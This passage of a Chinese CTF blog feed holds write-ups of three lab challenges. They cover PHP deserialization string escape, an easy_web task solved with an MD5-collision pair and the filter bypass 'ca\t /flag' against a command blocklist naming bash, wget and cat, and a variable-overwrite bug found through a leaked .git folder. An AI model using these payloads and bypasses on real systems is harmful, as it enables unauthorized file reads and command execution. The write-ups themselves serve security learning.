class="hljs-number">4</span>:<span class="hljs-string">&quot;defg&quot;</span>;&#125;&quot; <br></code></pre></td></tr></table></figure><p>反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//$a = array(&#x27;123&#x27;, &#x27;abc&#x27;, &#x27;defg&#x27;);</span><br><span class="hljs-comment">//var_dump(serialize($a));</span><br><span class="hljs-comment">//&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br>$b = <span class="hljs-string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize($b));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">array(<span class="hljs-number">3</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;123&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;abc&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;defg&quot;</span> &#125; <br></code></pre></td></tr></table></figure><p>  我们可以看到在后端中，反序列化是一”;}结束的，如果我们把”;}带入需要反序列化的字符串中（除了结尾处），是不是就能让反序列化提前结束后面的内容就丢弃了呢？<br>  我们把第二个值abc换成abc”;i:2;s:5:”qwert”;}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//$a = array(&#x27;123&#x27;, &#x27;abc&#x27;, &#x27;defg&#x27;);</span><br><span class="hljs-comment">//var_dump(serialize($a));</span><br><span class="hljs-comment">//&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br>$b = <span class="hljs-string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize($b));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">array(<span class="hljs-number">3</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;123&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;abc&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;qwert&quot;</span> &#125; <br></code></pre></td></tr></table></figure><p>成功的反序列化出我们自己定义的内容，丢弃了原先的内容（i:2;s:4:”defg”）<br>反序列化字符逃逸就先介绍到这里，我们回过头来看一下题</p><ul><li>突破口<br>我们发现一个问题，我们反序列化字符逃逸，首先序列化的字符是可控的，还有前面的长度是可控的。但update.php将参数序列化，我们可控变量的长度就已经写死了，怎么才能去控制呢。这道题的突破口其实就是序列化过后数据过滤替换那里，看似更加安全，其实更加危险。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//过滤函数</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params">$string</span>) </span>&#123;<br>$escape = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br>$escape = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $escape) . <span class="hljs-string">&#x27;/&#x27;</span>;<br>$string = preg_replace($escape, <span class="hljs-string">&#x27;_&#x27;</span>, $string);<br><br>$safe = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br>$safe = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $safe) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> preg_replace($safe, <span class="hljs-string">&#x27;hacker&#x27;</span>, $string);<br>&#125;<br></code></pre></td></tr></table></figure><p>  这里是将’select’, ‘insert’, ‘update’, ‘delete’, ‘where’替换成’hacker’，我们写入where替换成hacker之后字符串实际的长度就+1，因此实际的长度大于序列化固定的长度（变量前面‘s’里的值）。利用反序列化字符串逃逸，反序列化时只能将字符串中nickname前面的s后面长度的字符串反序列化成功，这个是传参的时候就固定好了。剩下的字符串我们构造成class.php因为里面包含了flag，并且让他在photo位置上，然后把photo给扔掉，这样在profile.php中读取的photo就是我们构造的config.php了，也就是读取到了flag<br>  简单说就是利用后端的函数替换，导致实际长度增加，增加的部分（config.php）被挤了出来，到了photo的位置上，然后闭合。<br>  再举个例方便大家理解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//$a = array(&#x27;123&#x27;, &#x27;abc&#x27;, &#x27;defg&#x27;);</span><br><span class="hljs-comment">//var_dump(serialize($a));</span><br><span class="hljs-comment">//&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br>$a = <span class="hljs-string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;<br>$b = <span class="hljs-string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize($b));<br>var_dump(unserialize($b));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>abc前面的s:3:不变，因为是序列化的时候固定了<br>我们将abc构造成：abc”;i:2;s:5:”qwert”;}我们再最后构造了一个闭合，导致defg被丢弃，qwert占用了defg原本的位置<br>  还是回到这一道题上，我们的目的是将”;}s:5:”photo”;s:10:”config.php”;}插入序列化的字符串里面去，这个的长度为34，所以我们要挤出来34位，不然就成了nickname的值了。where会替换成hacker，长度加1，所以我们要构造34个where。然后去profile.php查看读取的内容。</p><h5 id="解题继续"><a href="#解题继续" class="headerlink" title="解题继续"></a>解题继续</h5><p>nickname传入，并且nickname要改成nickname[]</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span>&quot;;&#125;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:&quot;photo&quot;</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:&quot;config.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/08/17/2021/ctf/12/image-20210817203900289.png" alt="image-20210817203900289"></p><p>上传成功，去访问profile.php</p><p><img src="/2021/08/17/2021/ctf/12/image-20210817204106098.png" alt="image-20210817204106098"></p><hr><p><img src="/2021/08/17/2021/ctf/12/image-20210817204134202.png" alt="image-20210817204134202"></p><p>解码一下</p><p><img src="/2021/08/17/2021/ctf/12/image-20210817204228388.png" alt="image-20210817204228388"></p>]]></content>
      
      
      <categories>
          
          <category> CTF·反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯 2019 easy_web</title>
      <link href="/2021/08/08/2021/ctf/10/"/>
      <url>/2021/08/08/2021/ctf/10/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><h5 id="MD5碰撞的一些例子"><a href="#MD5碰撞的一些例子" class="headerlink" title="MD5碰撞的一些例子"></a>MD5碰撞的一些例子</h5><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p><h5 id="PHP代码安全【PHP弱口令、加密函数、绕过函数】-CTF代码审计题"><a href="#PHP代码安全【PHP弱口令、加密函数、绕过函数】-CTF代码审计题" class="headerlink" title="PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题"></a>PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题</h5><p><a href="https://sp4rkw.blog.csdn.net/article/details/79088218">https://sp4rkw.blog.csdn.net/article/details/79088218</a></p><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机启动：</p><p><img src="/2021/08/08/2021/ctf/10/image-20210809085159186.png" alt="image-20210809085159186"></p><p>观察到url路径存在参数</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;<span class="hljs-keyword">cmd</span><span class="bash">=</span><br></code></pre></td></tr></table></figure><p>感觉这里就是切入点，img背后的似乎是base64码</p><p>在线解码一下（<a href="https://base64.us/%EF%BC%89%EF%BC%9A">https://base64.us/）：</a></p><p>TXpVek5UTTFNbVUzTURabE5qYz0</p><p>MzUzNTM1MmU3MDZlNjc=</p><p>3535352e706e67</p><p>连续两次base64解码后，得到一串字符串</p><p>查了资料，这是hex编码</p><p><img src="/2021/08/08/2021/ctf/10/image-20210809085725782.png" alt="image-20210809085725782"></p><p>再次解码：得到555.png，有意思</p><p>刚好靶机页面上就有一张哭泣图片</p><p>我们猜测，img后面的多次编码的参数请求可以得到源码</p><p>按照上面的解码逆推编码，可以得到</p><p>index.php:</p><p>696E6465782E706870</p><p>Njk2RTY0NjU3ODJFNzA2ODcw</p><p>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</p><p>将参数修改</p><p><img src="/2021/08/08/2021/ctf/10/image-20210809090352667.png" alt="image-20210809090352667"></p><p>f12查看</p><p><img src="/2021/08/08/2021/ctf/10/image-20210809090426959.png" alt="image-20210809090426959"></p><p>对base64解码得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(E_ALL || ~ E_NOTICE);<br>header(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br>$cmd = $_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    header(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br>$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br>$file = preg_replace(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, $file);<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, $file)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    $txt = base64_encode(file_get_contents($file));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> $cmd;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)$_POST[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)$_POST[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `$cmd`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h5><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|<span class="hljs-tag">\<span class="hljs-name">&#x27;</span></span>|<span class="hljs-tag">\<span class="hljs-name">&quot;</span></span>|<span class="hljs-tag">\<span class="hljs-name">`</span></span>|;|,|<span class="hljs-tag">\<span class="hljs-name">*</span></span>|<span class="hljs-tag">\<span class="hljs-name">?</span></span>|<span class="hljs-tag">\<span class="hljs-name">\</span></span>|<span class="hljs-tag">\<span class="hljs-name">\</span></span><span class="hljs-tag">\<span class="hljs-name">\</span></span>|<span class="hljs-tag">\<span class="hljs-name">n</span></span>|<span class="hljs-tag">\<span class="hljs-name">t</span></span>|<span class="hljs-tag">\<span class="hljs-name">r</span></span>|<span class="hljs-tag">\<span class="hljs-name">xA</span></span>0|<span class="hljs-tag">\<span class="hljs-name">&#123;</span></span>|<span class="hljs-tag">\<span class="hljs-name">&#125;</span></span>|<span class="hljs-tag">\<span class="hljs-name">(</span></span>|<span class="hljs-tag">\<span class="hljs-name">)</span></span>|<span class="hljs-tag">\<span class="hljs-name">&amp;</span><span class="hljs-string">[^\d]</span></span>|@|<span class="hljs-tag">\<span class="hljs-name">|</span></span>|<span class="hljs-tag">\<span class="hljs-name">\</span></span><span class="hljs-formula">$|<span class="hljs-tag">\<span class="hljs-name">[</span></span>|<span class="hljs-tag">\<span class="hljs-name">]</span></span>|&#123;|&#125;|<span class="hljs-tag">\<span class="hljs-name">(</span></span>|<span class="hljs-tag">\<span class="hljs-name">)</span></span>|-|&lt;|&gt;/i&quot;, $</span>cmd<br></code></pre></td></tr></table></figure><p>这里对cmd的值进行了正则过滤，一般的l像s指令都不可以用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)$_POST[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)$_POST[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>       <span class="hljs-keyword">echo</span> `$cmd`;<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>       <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br></code></pre></td></tr></table></figure><p>这里说明我们需要POST两个变量：a和b</p><p>它们作为字符串时的值弱比较不相等，md5加密的值强比较要相等（<strong>md5碰撞</strong>）</p><p>这里不太理解，所以先直接抄了wp的md5值</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%55</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span>&amp;b=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%02</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%d5</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span><br></code></pre></td></tr></table></figure><p>POST传参</p><p>这里最好不要用hackbar，因为hackbar好像会把md5值再编码</p><p>（这个地方坑了我好久）</p><p>在请求到包后，直接在bp里改包</p><p>原来的GET请求直接改成POST请求</p><p><img src="/2021/08/08/2021/ctf/10/image-20210809092901502.png" alt="image-20210809092901502"></p><p>使用还没被ban掉的dir指令</p><p>查询到文件</p><p><img src="/2021/08/08/2021/ctf/10/image-20210809092634318.png" alt="image-20210809092634318"></p><p>然后直接用了多数博客都使用的绕过方法</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="bash">=ca\t%20/flag</span><br></code></pre></td></tr></table></figure><p><img src="/2021/08/08/2021/ctf/10/image-20210809093215609.png" alt="image-20210809093215609"></p><p>看网上还有一种方法读取flag：</p><p>sort命令：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p><p><img src="/2021/08/08/2021/ctf/10/1625650-20200130214928556-987685402.png" alt="img"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/wangtanzhi/p/12244096.html">https://www.cnblogs.com/wangtanzhi/p/12244096.html</a></p><p><a href="https://blog.csdn.net/qq_43622442/article/details/106012150">https://blog.csdn.net/qq_43622442/article/details/106012150</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF·rce </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020 Mark loves cat</title>
      <link href="/2021/08/07/2021/ctf/9/"/>
      <url>/2021/08/07/2021/ctf/9/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><ol><li><h5 id="git源码泄露；"><a href="#git源码泄露；" class="headerlink" title=".git源码泄露；"></a>.git源码泄露；</h5></li><li><h5 id="导致变量覆盖漏洞（参考CTF之php变量覆盖漏洞）"><a href="#导致变量覆盖漏洞（参考CTF之php变量覆盖漏洞）" class="headerlink" title="$$导致变量覆盖漏洞（参考CTF之php变量覆盖漏洞）"></a><code>$$</code>导致变量覆盖漏洞（参考<a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞</a>）</h5></li></ol><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机启动：</p><p><img src="/2021/08/07/2021/ctf/9/image-20210807153209853.png" alt="image-20210807153209853"></p><p>没有什么有用信息</p><p>扫描一下目录</p><p><img src="/2021/08/07/2021/ctf/9/image-20210807102252828.png" alt="image-20210807102252828"></p><p><img src="/2021/08/07/2021/ctf/9/image-20210807102702092.png" alt="image-20210807102702092"></p><p>（调低线程后）</p><p><img src="/2021/08/07/2021/ctf/9/image-20210807110900544.png" alt="image-20210807110900544"></p><p>发现存在flag.php</p><p>我们再用GitHack下载下来。</p><p>得到两个文件index.php和flag.php</p><h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php:"></a>index.php:</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>include <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br>foreach(<span class="hljs-variable">$_POST</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = <span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br><br>echo <span class="hljs-string">&quot;the flag is: &quot;</span>.<span 